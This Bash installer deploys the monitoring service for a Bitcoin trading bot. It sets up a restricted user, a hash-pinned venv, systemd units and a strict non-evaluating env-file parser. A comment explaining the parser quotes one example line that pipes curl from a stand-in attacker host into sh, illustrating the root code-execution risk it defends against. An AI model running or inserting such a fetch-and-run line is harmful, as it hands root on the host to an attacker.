#!/usr/bin/env bash
set -euo pipefail

RELEASE_DIR=${1:?usage: install_monitoring.sh RELEASE_DIR MODE RELEASE_HASH}
MODE=${2:?usage: install_monitoring.sh RELEASE_DIR MODE RELEASE_HASH}
RELEASE_HASH=${3:?usage: install_monitoring.sh RELEASE_DIR MODE RELEASE_HASH}
APP_ROOT=/opt/bitcoin-bot
PRIVATE=/etc/bitcoin-bot
PERSIST=/var/lib/bitcoin-bot/shared
MONITOR_LOG_DIR=/var/log/bitcoin-bot/monitor
KEEP_MONITOR_VENVS=${KEEP_MONITOR_VENVS:-4}

fail(){ echo "ERROR: $*" >&2; exit 1; }

# >>> BEGIN INLINED deploy/lib/envfile.sh (do not edit; see that file) >>>
# Strict, non-evaluating reader for KEY=VALUE environment files.
#
# WHY THIS EXISTS
#
# The privileged installers previously did:
#
#     set -a
#     source "$ENV_FILE"
#     set +a
#
# `source` makes Bash *interpret* the file. Every value is shell code, so a
# single line such as
#
#     COMMAND_HMAC_KEY=$(curl -s http://attacker/x | sh)
#
# executes as whatever user runs the installer. install_artifact.sh and
# install_monitoring.sh escalate through `as_root`, so that is root.
#
# The old mode check (`stat -c '%a' == 600`) constrained permissions but never
# ownership, and the rollback path sourced configuration snapshots under
# /var/lib/bitcoin-bot/config-snapshots, which oracle_setup.sh chowns to the
# unprivileged deployment user. Anyone able to write a snapshot could therefore
# execute arbitrary code as root during the next upgrade or rollback.
#
# These helpers never evaluate a value. Assignment uses `printf -v`, which
# writes the bytes literally, and every key is validated against a strict
# identifier pattern before it is used as a variable name.
#
# Regression coverage: tests/test_env_file_parser.py

env_file_fail() { echo "ERROR: $*" >&2; return 1; }

# env_file_require_trusted FILE
#
# A file that a privileged process is about to read must be a real file, not a
# symlink, owned by root, and not writable by group or other.
env_file_require_trusted() {
  local file=$1 owner mode
  [[ -f "$file" && ! -L "$file" ]] || {
    env_file_fail "environment file is missing or a symlink: $file"; return 1; }
  owner=$(stat -c '%u' "$file" 2>/dev/null) || {
    env_file_fail "cannot stat environment file: $file"; return 1; }
  [[ "$owner" == "0" ]] || {
    env_file_fail "environment file must be owned by root (uid 0), found uid $owner: $file"
    return 1; }
  mode=$(stat -c '%a' "$file" 2>/dev/null)
  mode=${mode: -3}
  case "$mode" in
    600|640|400|440) ;;
    *) env_file_fail "environment file must not be group- or world-writable (mode $mode): $file"
       return 1 ;;
  esac
  return 0
}

# _env_file_unquote NAME
#
# Strips one balanced layer of single or double quotes. Nothing is expanded.
_env_file_unquote() {
  local __name=$1 __v=${!1}
  if [[ ${#__v} -ge 2 ]]; then
    if [[ ${__v:0:1} == '"' && ${__v: -1} == '"' ]]; then
      __v=${__v:1:${#__v}-2}
    elif [[ ${__v:0:1} == "'" && ${__v: -1} == "'" ]]; then
      __v=${__v:1:${#__v}-2}
    fi
  fi
  printf -v "$__name" '%s' "$__v"
}

# env_file_get FILE KEY
#
# Prints the literal value of KEY, or returns 1 when absent. The last
# assignment wins, matching how `source` behaved for duplicate keys.
env_file_get() {
  local file=$1 want=$2 line key value found=1 result=''
  [[ "$want" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || {
    env_file_fail "invalid environment key requested: $want"; return 1; }
  while IFS= read -r line || [[ -n "$line" ]]; do
    line=${line%$'\r'}
    line=${line#"${line%%[![:space:]]*}"}
    [[ -z "$line" || "$line" == '#'* ]] && continue
    [[ "$line" == *=* ]] || continue
    key=${line%%=*}
    key=${key%"${key##*[![:space:]]}"}
    [[ "$key" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || continue
    [[ "$key" == "$want" ]] || continue
    value=${line#*=}
    _env_file_unquote value
    result=$value
    found=0
  done < "$file"
  [[ $found -eq 0 ]] || return 1
  printf '%s' "$result"
  return 0
}

# env_file_pairs FILE
#
# Emits NUL-separated KEY=VALUE records for use as literal `env` arguments:
#
#     while IFS= read -r -d '' kv; do args+=("$kv"); done < <(env_file_pairs f)
#     env -i "${args[@]}" some-command
#
# `env` treats each argument as data, so this replaces `set -a; source FILE`
# inside a clean-environment subshell without ever evaluating a value.
env_file_pairs() {
  local file=$1 line key value lineno=0
  while IFS= read -r line || [[ -n "$line" ]]; do
    lineno=$((lineno + 1))
    line=${line%$'\r'}
    line=${line#"${line%%[![:space:]]*}"}
    [[ -z "$line" || "$line" == '#'* ]] && continue
    [[ "$line" == *=* ]] || {
      env_file_fail "$file line $lineno is not KEY=VALUE"; return 1; }
    key=${line%%=*}
    key=${key%"${key##*[![:space:]]}"}
    [[ "$key" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || {
      env_file_fail "$file line $lineno has an invalid key name"; return 1; }
    value=${line#*=}
    _env_file_unquote value
    printf '%s=%s\0' "$key" "$value"
  done < "$file"
  return 0
}

# env_file_load FILE
#
# Exports every well-formed KEY=VALUE pair, literally. A malformed key is
# rejected outright rather than skipped, so a corrupt or tampered file fails
# closed instead of silently loading a partial configuration.
env_file_load() {
  local file=$1 line key value lineno=0
  while IFS= read -r line || [[ -n "$line" ]]; do
    lineno=$((lineno + 1))
    line=${line%$'\r'}
    line=${line#"${line%%[![:space:]]*}"}
    [[ -z "$line" || "$line" == '#'* ]] && continue
    [[ "$line" == *=* ]] || {
      env_file_fail "$file line $lineno is not KEY=VALUE"; return 1; }
    key=${line%%=*}
    key=${key%"${key##*[![:space:]]}"}
    [[ "$key" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || {
      env_file_fail "$file line $lineno has an invalid key name"; return 1; }
    value=${line#*=}
    _env_file_unquote value
    printf -v "$key" '%s' "$value"
    export "${key?}"
  done < "$file"
  return 0
}
# <<< END INLINED deploy/lib/envfile.sh <<<
[[ $EUID -eq 0 ]] || fail 'install_monitoring.sh must run as root'
[[ "$MODE" == simulation || "$MODE" == testnet || "$MODE" == live ]] || \
  fail 'MODE must be simulation, testnet, or live'
[[ "$RELEASE_HASH" =~ ^[0-9a-f]{64}$ ]] || fail 'invalid release hash'
[[ "$KEEP_MONITOR_VENVS" =~ ^[1-9][0-9]*$ ]] || fail 'KEEP_MONITOR_VENVS must be a positive integer'
RELEASE_DIR=$(readlink -f "$RELEASE_DIR")
[[ -d "$RELEASE_DIR/monitoring" ]] || fail 'monitoring source missing from release'
case "$(<"$RELEASE_DIR/RELEASE_MODE")" in
live|testnet) ;;
*) fail 'monitoring requires a live or testnet Bitcoin release' ;;
esac
[[ -d "$PERSIST/runtime" ]] || fail 'persistent runtime directory was not prepared'

if ! id botmon >/dev/null 2>&1; then
  useradd --system --home-dir /nonexistent --shell /usr/sbin/nologin botmon
fi
for forbidden_group in docker sudo adm lxd disk root; do
  if id -nG botmon | tr ' ' '\n' | grep -Fxq "$forbidden_group"; then
    fail "botmon unexpectedly belongs to privileged group: $forbidden_group"
  fi
done
install -d -m 0755 -o root -g root "$APP_ROOT/monitoring-venvs" /usr/local/libexec
install -d -m 0750 -o botmon -g botmon "$MONITOR_LOG_DIR"

# Never chown or chmod the bot's runtime tree here. Trading services own that
# state; monitoring is a read-only consumer and must fail visibly if host
# permissions were configured incorrectly.
runuser -u botmon -- test -x "$PERSIST" || fail 'botmon cannot traverse the persistent shared directory'
runuser -u botmon -- test ! -w "$PERSIST/runtime" || fail 'botmon must not be able to write runtime state'

VENV_ROOT="$APP_ROOT/monitoring-venvs"
VENV_TARGET="$VENV_ROOT/$RELEASE_HASH"
if [[ ! -f "$VENV_TARGET/.complete" ]]; then
  [[ ! -e "$VENV_TARGET" ]] || fail "incomplete monitoring venv exists: $VENV_TARGET"
  BUILD=$(mktemp -d "$VENV_ROOT/.build.XXXXXX")
  trap 'rm -rf --one-file-system -- "$BUILD"' EXIT
  python3 -m venv "$BUILD/venv"
  "$BUILD/venv/bin/python" -m pip install --disable-pip-version-check \
    --require-hashes --requirement "$RELEASE_DIR/monitoring/requirements-monitoring.lock"
  "$BUILD/venv/bin/python" -m pip check
  touch "$BUILD/venv/.complete"
  mv "$BUILD/venv" "$VENV_TARGET"
  rmdir "$BUILD"
  trap - EXIT
fi
[[ -d "$VENV_TARGET" && ! -L "$VENV_TARGET" \
   && $(readlink -f "$VENV_TARGET") == "$VENV_TARGET" \
   && $(dirname "$VENV_TARGET") == "$VENV_ROOT" \
   && -f "$VENV_TARGET/.complete" && ! -L "$VENV_TARGET/.complete" \
   && $(stat -c '%u:%g' "$VENV_TARGET") == 0:0 ]] || \
  fail 'monitoring venv is not a canonical root-owned complete generation'
ln -sfn "$VENV_TARGET" "$APP_ROOT/monitoring-current.new"
mv -Tf "$APP_ROOT/monitoring-current.new" "$APP_ROOT/monitoring-current"

# The privileged Docker snapshot helper is copied outside the writable release
# tree and made root-owned. botmon never receives the Docker socket.
install -m 0755 -o root -g root \
  "$RELEASE_DIR/monitoring/snapshot.py" \
  /usr/local/libexec/bitcoin-bot-monitor-snapshot

ENV_FILE="$PRIVATE/${MODE}-monitor.env"
TEMPLATE="$RELEASE_DIR/monitoring/.env.monitor.${MODE}.example"
if [[ ! -f "$ENV_FILE" ]]; then
  install -m 0640 -o root -g botmon "$TEMPLATE" "$ENV_FILE"
fi
if grep -Eq '^MONITOR_TOKEN=(replace_on_oracle_only|changeme|)$' "$ENV_FILE"; then
  TOKEN=$(python3 -c 'import secrets; print(secrets.token_hex(32))')
  sed -i "s/^MONITOR_TOKEN=.*/MONITOR_TOKEN=${TOKEN}/" "$ENV_FILE"
fi
chown root:botmon "$ENV_FILE"
chmod 0640 "$ENV_FILE"
# Parsed as literal data; see deploy/lib/envfile.sh.
env_file_require_trusted "$ENV_FILE" || \
  fail "$ENV_FILE must be a regular root-owned file that is not group- or world-writable"
env_file_load "$ENV_FILE" || fail "$ENV_FILE is not a valid KEY=VALUE environment file"
monitor_token_upper=${MONITOR_TOKEN:-}
monitor_token_upper=${monitor_token_upper^^}
[[ ${#MONITOR_TOKEN} -ge 32 ]] || fail 'MONITOR_TOKEN must contain at least 32 characters'
[[ "$monitor_token_upper" != *REPLACE* && "$monitor_token_upper" != *CHANGE* \
   && "$monitor_token_upper" != *GENERATE* && "$monitor_token_upper" != *EXAMPLE* ]] || \
  fail 'MONITOR_TOKEN still contains a public placeholder'

UNIT_DIR="$RELEASE_DIR/monitoring/systemd"
install -m 0644 -o root -g root \
  "$UNIT_DIR/bitcoin-bot-monitor-${MODE}.service" \
  "$UNIT_DIR/bitcoin-bot-monitor-report-${MODE}.service" \
  "$UNIT_DIR/bitcoin-bot-monitor-report-${MODE}.timer" \
  "$UNIT_DIR/bitcoin-bot-monitor-snapshot.service" \
  "$UNIT_DIR/bitcoin-bot-monitor-snapshot.timer" \
  /etc/systemd/system/

for other in simulation testnet live; do
  [[ "$other" == "$MODE" ]] && continue
  systemctl disable --now "bitcoin-bot-monitor-${other}.service" \
    "bitcoin-bot-monitor-report-${other}.timer" >/dev/null 2>&1 || true
done
systemctl daemon-reload

monitor_enabled=${MONITOR_ENABLED:-false}
reports_enabled=${TELEGRAM_REPORTS_ENABLED:-false}
[[ "$monitor_enabled" == true || "$monitor_enabled" == false ]] || fail 'MONITOR_ENABLED must be true or false'
[[ "$reports_enabled" == true || "$reports_enabled" == false ]] || fail 'TELEGRAM_REPORTS_ENABLED must be true or false'
if [[ "$reports_enabled" == true ]]; then
  [[ "$monitor_enabled" == true ]] || fail 'Telegram reports require MONITOR_ENABLED=true'
  [[ "${TELEGRAM_MONITOR_BOT_TOKEN:-}" =~ ^[0-9]+:[A-Za-z0-9_-]{20,}$ ]] || \
    fail 'monitor Telegram token is missing, placeholder, or malformed'
  [[ "${TELEGRAM_MONITOR_CHAT_ID:-}" =~ ^-?[0-9]+$ ]] || \
    fail 'monitor Telegram chat id must be numeric'
fi

if [[ "$monitor_enabled" == true ]]; then
  systemctl enable bitcoin-bot-monitor-snapshot.timer >/dev/null
  systemctl restart bitcoin-bot-monitor-snapshot.timer
  systemctl start bitcoin-bot-monitor-snapshot.service
  [[ $(systemctl show -p Result --value bitcoin-bot-monitor-snapshot.service) == success ]] || \
    fail 'initial container snapshot did not complete successfully'
  systemctl enable "bitcoin-bot-monitor-${MODE}.service" >/dev/null
  systemctl restart "bitcoin-bot-monitor-${MODE}.service"
else
  systemctl disable --now "bitcoin-bot-monitor-${MODE}.service" \
    bitcoin-bot-monitor-snapshot.timer >/dev/null 2>&1 || true
fi
if [[ "$reports_enabled" == true ]]; then
  systemctl enable "bitcoin-bot-monitor-report-${MODE}.timer" >/dev/null
  systemctl restart "bitcoin-bot-monitor-report-${MODE}.timer"
else
  systemctl disable --now "bitcoin-bot-monitor-report-${MODE}.timer" >/dev/null 2>&1 || true
fi

# Post-install state is part of deployment health, not a best-effort step.
if [[ "$monitor_enabled" == true ]]; then
  for _ in $(seq 1 20); do
    systemctl is-active --quiet "bitcoin-bot-monitor-${MODE}.service" && break
    sleep 1
  done
  systemctl is-active --quiet "bitcoin-bot-monitor-${MODE}.service" || \
    fail "monitor API service did not become active for $MODE"
  systemctl is-active --quiet bitcoin-bot-monitor-snapshot.timer || \
    fail 'monitor snapshot timer is not active'
  [[ -n "${MONITOR_TOKEN:-}" && -n "${MONITOR_PORT:-}" ]] || fail 'monitor token/port missing after install'
  probe_host=${MONITOR_BIND_HOST:-127.0.0.1}
  [[ "$probe_host" == 0.0.0.0 || "$probe_host" == '::' ]] && probe_host=127.0.0.1
  probe_url="http://${probe_host}:${MONITOR_PORT}/api/v1/health"
  [[ "$probe_host" == *:* ]] && probe_url="http://[${probe_host}]:${MONITOR_PORT}/api/v1/health"
  api_ok=false
  for _ in $(seq 1 20); do
    if MONITOR_PROBE_URL="$probe_url" python3 - <<'PY' >/dev/null 2>&1
import os
import urllib.request

request = urllib.request.Request(
    os.environ['MONITOR_PROBE_URL'],
    headers={'Authorization': 'Bearer ' + os.environ['MONITOR_TOKEN']},
)
with urllib.request.urlopen(request, timeout=3) as response:
    if response.status != 200:
        raise SystemExit(1)
PY
    then
      api_ok=true
      break
    fi
    sleep 1
  done
  [[ "$api_ok" == true ]] || fail 'authenticated monitor health endpoint did not respond'
else
  ! systemctl is-active --quiet "bitcoin-bot-monitor-${MODE}.service" || \
    fail 'monitor API is active despite MONITOR_ENABLED=false'
fi
if [[ "$reports_enabled" == true ]]; then
  systemctl is-active --quiet "bitcoin-bot-monitor-report-${MODE}.timer" || \
    fail 'monitor report timer is not active'
fi

for readable in \
  "$PERSIST/pair/active_pair.json" \
  "$PERSIST/moneyflow/latest.json" \
  "$PERSIST/runtime/moneyflow/moneyflow_health.json" \
  "$PERSIST/runtime/sidecar/execution_state.sqlite" \
  "$PERSIST/runtime/sidecar/sidecar_health.json" \
  "$PERSIST/runtime/telegram/telegram_health.json" \
  "$PERSIST/runtime/container_status.json" \
  "$PERSIST/runtime/deployment_status.json"; do
  [[ -f "$readable" ]] || fail "monitoring input missing after stack health: $readable"
  runuser -u botmon -- test -r "$readable" || fail "botmon cannot read monitoring input: $readable"
  runuser -u botmon -- test ! -w "$readable" || fail "botmon can unexpectedly write: $readable"
done
runuser -u botmon -- test ! -r /var/run/docker.sock || fail 'botmon must not read the Docker socket'

# The current release plus three rollback generations is sufficient for the
# default retention policy. Only complete, direct hash-named venvs are eligible
# for bounded cleanup; build directories and unrelated paths are never touched.
active_venv=$(readlink -f "$APP_ROOT/monitoring-current")
[[ -d "$active_venv" && ! -L "$active_venv" \
   && $(dirname "$active_venv") == "$VENV_ROOT" \
   && $(basename "$active_venv") =~ ^[0-9a-f]{64}$ ]] || \
  fail 'active monitoring venv is not a canonical direct generation'
kept_old=0
while IFS= read -r candidate; do
  [[ -n "$candidate" && "$candidate" != "$active_venv" ]] || continue
  resolved=$(readlink -f "$candidate" || true)
  name=$(basename "$candidate")
  [[ -d "$candidate" && ! -L "$candidate" && "$resolved" == "$candidate" \
     && $(dirname "$resolved") == "$VENV_ROOT" \
     && "$name" =~ ^[0-9a-f]{64}$ \
     && -f "$candidate/.complete" && ! -L "$candidate/.complete" \
     && $(stat -c '%u:%g' "$candidate") == 0:0 ]] || continue
  if (( kept_old < KEEP_MONITOR_VENVS - 1 )); then
    kept_old=$((kept_old + 1))
    continue
  fi
  rm -rf --one-file-system -- "$resolved"
  [[ ! -e "$resolved" ]] || fail "monitoring venv contains a nested mount: $resolved"
done < <(find "$VENV_ROOT" -mindepth 1 -maxdepth 1 -type d -printf '%T@ %p\n' | \
  sort -nr | cut -d' ' -f2-)

echo "Monitoring installed and post-install state verified for $MODE; credentials were not printed."
